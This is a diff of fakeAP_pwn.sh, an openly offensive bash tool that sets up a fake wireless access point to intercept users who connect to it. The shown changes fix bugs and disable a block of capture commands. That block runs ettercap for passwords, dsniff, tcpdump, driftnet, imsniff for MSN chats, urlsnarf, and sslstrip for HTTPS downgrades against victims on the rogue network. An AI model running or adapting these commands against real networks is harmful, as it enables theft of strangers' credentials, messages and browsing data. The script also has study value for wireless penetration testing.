@@ -1,6 +1,6 @@
 #!/bin/bash
 #----------------------------------------------------------------------------------------------#
-#fakeAP_pwn.sh v0.3 (#125 2010-10-28)                                                          #
+#fakeAP_pwn.sh v0.3 (#126 2010-10-30)                                                          #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
 #---License------------------------------------------------------------------------------------#
 #  This program is free software: you can redistribute it and/or modify it under the terms     #
@@ -67,7 +67,7 @@ diagnostics="false"                    # Creates a output file displays exactly 
 displayMore="false"                    # Gives more details on whats happening
       debug="false"                    # Doesn't delete files, shows more on screen etc
     logFile="fakeAP_pwn.log"           # Filename of output
-        svn="125"                      # SVN Number
+        svn="126"                      # SVN Number
     version="0.3 (#$svn)"              # Program version
 trap 'cleanUp interrupt' 2             # Captures interrupt signal (Ctrl + C)
 
@@ -125,8 +125,8 @@ function cleanUp() { #cleanUp #mode
 
       if [ "$mode" == "non" ] ; then # Else will will remove their internet access!
          if [ "$displayMore" == "true" ] ; then display action "Restoring: Network" ; fi
-         command=""
-         if [ $(route | grep "10.0.0.0") ] ; then command="route del -net 10.0.0.0 netmask 255.255.255.0 gw $ourIP $apInterface ; " ; fi
+         command="" ; tmp=$(route | grep "10.0.0.0")
+         if [ "$tmp" ] ; then command="route del -net 10.0.0.0 netmask 255.255.255.0 gw $ourIP $apInterface ; " ; fi
          command="$command echo \"0\" > /proc/sys/net/ipv4/ip_forward"
          action "Restoring: Network" "$command"
          action "ipTables" "cat /var/log/kern.log | grep fakeAP_pwn > $(pwd)/tmp/fakeAP_pwn.log.iptables" #syslog
@@ -341,7 +341,7 @@ function testAP() { #testAP $essid $wifiInterface
    if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi
 
    if [ "$error" == "free" ] ; then
-      eval list=( $(iwlist $2 scan 2>/dev/null | awk -F":" '/essid/{print $2}') )
+      eval list=( $(iwlist $2 scan 2>/dev/null | awk -F":" '/ESSID/{print $2}') )
       if [ -z "${list[0]}" ]; then
          return 2 # Couldn't detect a single access point
       fi
@@ -394,7 +394,7 @@ function update() { #update
 echo -e "\e[01;36m[*]\e[00m fakeAP_pwn v$version"
 
 #----------------------------------------------------------------------------------------------#
-if [ "$(id -u)" != "0" ] ; then display error "Run as root" 1>&2 ; cleanUp nonuser; fi
+if [ "$(id -u)" != "0" ] ; then display error "Run as root" 1>&2 ; cleanUp nonuser ; fi
 
 #----------------------------------------------------------------------------------------------#
 while getopts "i:w:t:e:c:y:m:p:b:h:q:rz:s:xdvVu?" OPTIONS; do
@@ -712,10 +712,10 @@ if [ "$extras" == "true" ] ; then
       if [ ! -e "/usr/bin/driftnet" ] ; then display error "Failed to install driftnet" 1>&2 ; cleanUp
       else display info "Installed: driftnet" ; fi
    fi
-   if [ ! -e "/pentest/spoofing/sslstrip/sslstrip.py" ] ; then
+   if [ ! -e "/pentest/spoofing/sslstrip/sslstrip.py" ] && [ ! -e "/usr/bin/sslstrip" ] ; then
       display error "sslstrip isn't installed"
       read -p "[~] Would you like to try and install it? [Y/n]: "
-      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "wget -P /tmp http://www.thoughtcrime.org/software/sslstrip/sslstrip-0.7.tar.gz && tar -C /tmp -xvf $(pwd)/tmp/sslstrip-0.7.tar.gz && rm $(pwd)/tmp/sslstrip-0.7.tar.gz && mkdir -p /pentest/spoofing/sslstrip/ && mv -f $(pwd)/tmp/sslstrip-0.7/* /pentest/spoofing/sslstrip/ && rm -rf $(pwd)/tmp/sslstrip-0.7" ; fi
+      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Installing sslstrip" "wget -P /tmp http://www.thoughtcrime.org/software/sslstrip/sslstrip-0.7.tar.gz && tar -C /tmp -xvf $(pwd)/tmp/sslstrip-0.7.tar.gz && rm $(pwd)/tmp/sslstrip-0.7.tar.gz && mkdir -p /pentest/spoofing/sslstrip/ && mv -f $(pwd)/tmp/sslstrip-0.7/* /pentest/spoofing/sslstrip/ && rm -rf $(pwd)/tmp/sslstrip-0.7" ; fi
       if [ ! -e "/pentest/spoofing/sslstrip/sslstrip.py" ] ; then display error "Failed to install sslstrip" 1>&2 ; cleanUp
       else display info "Installed: sslstrip" ; fi
    fi
@@ -816,7 +816,7 @@ action "MTU" "ifconfig \"$monitorInterface\" mtu \"$mtuMonitor\""
 #----------------------------------------------------------------------------------------------#
 command=$(iwconfig $interface 2>/dev/null | grep "802.11" | cut -d" " -f1)
 if [ "$command" ] ; then # $interface is WiFi. Therefore two WiFi cards
-   command=$(iwlist $interface scan 2>/dev/null | grep "essid:")
+   command=$(iwlist $interface scan 2>/dev/null | grep "ESSID:")
    if [ -n "$command" ] && ( [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ) ; then   # Checking for a access point to test as we haven't created one yet
       if [ "$diagnostics" == "true" ] ; then echo -e "$command" >> $logFile ; fi
       display diag "Testing: Wireless Injection"
@@ -1589,17 +1589,18 @@ else
 fi
 
 #----------------------------------------------------------------------------------------------#
-if [ "$extras" == "true" ] ; then
+#if [ "$extras" == "true" ] ; then
+if [ "$extras" == "DISABLED" ] ; then # This is creating more errors. Disabling it until I can test it more.
    display action "Caputuring: information from the target"
    #ipTables "sslstrip"
-   #action "SSL" "python /pentest/spoofing/sslstrip/sslstrip.py -k -f -l 10000 -w $(pwd)/tmp/fakeAP_pwn.ssl" "515|0|0" & # Don't wait, do the next command
-   action "Passwords" "ettercap -T -q -i $apInterface" "515|0|10" & # Don't wait, do the next command
-   #action "Passwords (2)" "dsniff -i $apInterface -w $(pwd)/tmp/fakeAP_pwn.dsniff" "515|0|101" & # Don't wait, do the next command
-   action "TCPDump" "tcpdump -i $apInterface -w $(pwd)/tmp/fakeAP_pwn.cap -v" "515|0|5" & # Don't wait, do the next command
-   action "Images" "driftnet -i $apInterface -d $(pwd)/tmp/" "515|0|0" & # Don't wait, do the next command
-   action "IM (MSN)" "imsniff $apInterface" "515|155|10" & # Don't wait, do the next command
+   #action "SSL" "python /pentest/spoofing/sslstrip/sslstrip.py -k -f -l 10000 -w $(pwd)/tmp/fakeAP_pwn.ssl" "false" "515|0|0" & # Don't wait, do the next command
+   action "Passwords" "ettercap -T -q -i $apInterface" "false" "515|0|10" & # Don't wait, do the next command
+   #action "Passwords (2)" "dsniff -i $apInterface -w $(pwd)/tmp/fakeAP_pwn.dsniff" "false" "515|0|101" & # Don't wait, do the next command
+   action "TCPDump" "tcpdump -i $apInterface -w $(pwd)/tmp/fakeAP_pwn.cap -v" "false" "515|0|5" & # Don't wait, do the next command
+   action "Images" "driftnet -i $apInterface -d $(pwd)/tmp/" "false" "515|0|0" & # Don't wait, do the next command
+   action "IM (MSN)" "imsniff $apInterface" "false" "515|155|10" & # Don't wait, do the next command
    #webspy / ettercap -P _browser_plugin
-   action "URLs" "urlsnarf -i $apInterface" "515|300|10" & # Don't wait, do the next command
+   action "URLs" "urlsnarf -i $apInterface" "false" "515|300|10" & # Don't wait, do the next command
    sleep 1
 fi
 
